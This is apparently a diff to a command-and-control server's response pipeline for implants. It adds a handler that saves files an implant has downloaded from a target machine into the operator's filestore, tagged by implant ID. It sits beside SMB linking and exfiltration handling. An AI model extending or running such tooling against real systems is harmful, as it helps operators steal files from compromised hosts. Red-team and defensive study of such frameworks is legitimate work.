@@ -2,9 +2,10 @@ import base64
 import hashlib
 
 import structlog
+from edwh_uuid7 import uuid7
 
 from ...db.mysql_connector import get_mysql_session
-from ...db.mysql_functions import MySQLImplantTaskService
+from ...db.mysql_functions import MySQLImplantFileService, MySQLImplantTaskService
 from ...db.neo4j_functions import (
     Neo4jChainingService,
     Neo4jFileNodeService,
@@ -148,6 +149,52 @@ def _handle_file_upload(task_request_dict: dict, task_response_dict: dict, impla
     # could do a file clear, that attempts to nuke all files, which would use the get_all_files_nodes_for_host
 
 
+def _handle_file_download(task_request_dict: dict, task_response_dict: dict, implant_uuid: str):  # noqa
+    file_download_logger = response_pipeline_logger.bind(task="file download")
+    try:
+        file_path = task_request_dict.get("task", {}).get("args", {}).get("file_path", "")
+        file_data = task_response_dict.get("result", {}).get("data", b"")
+
+        if not file_data:
+            file_download_logger.info("No file data in response")
+            return
+
+        # Data arrives as bytes for binary files (invalid UTF-8 survived _decode_bytes
+        # in handle_exfil) or as str for text files (valid UTF-8 got decoded). The
+        # implant sends raw content, never base64 — so str is re-encoded, not decoded.
+        if isinstance(file_data, str):
+            file_bytes = file_data.encode("utf-8")
+        elif isinstance(file_data, list | bytearray):
+            file_bytes = bytes(file_data)
+        else:
+            file_bytes = file_data
+
+        if not file_bytes:
+            return
+
+        file_name = file_path.rsplit("\\", 1)[-1].rsplit("/", 1)[-1] or "unknown_download"
+        file_uuid = str(uuid7())
+
+        with get_mysql_session() as session:
+            file_service = MySQLImplantFileService(session)
+            file_service.register_file(
+                file_name=file_name,
+                file_bytes=file_bytes,
+                file_uuid=file_uuid,
+                uploaded_by=f"implant:{implant_uuid}",
+                source_implant=implant_uuid,
+            )
+
+        file_download_logger.info(
+            "Auto-captured downloaded file to filestore",
+            file_name=file_name,
+            file_uuid=file_uuid,
+            size_bytes=len(file_bytes),
+        )
+    except Exception as e:
+        file_download_logger.error("Failed to auto-capture downloaded file", error=e)
+
+
 def _handle_smb_link(task_request_dict: dict, task_response_dict: dict, implant_uuid: str):  # noqa
     """
     Link actions.
@@ -186,6 +233,7 @@ TASK_HANDLERS = {
     "memstore clear": _handle_memstore_clear,
     "memstore delete": _handle_memstore_delete,
     "file upload": _handle_file_upload,
+    "file download": _handle_file_download,
     "link smb": _handle_smb_link,
 }
 
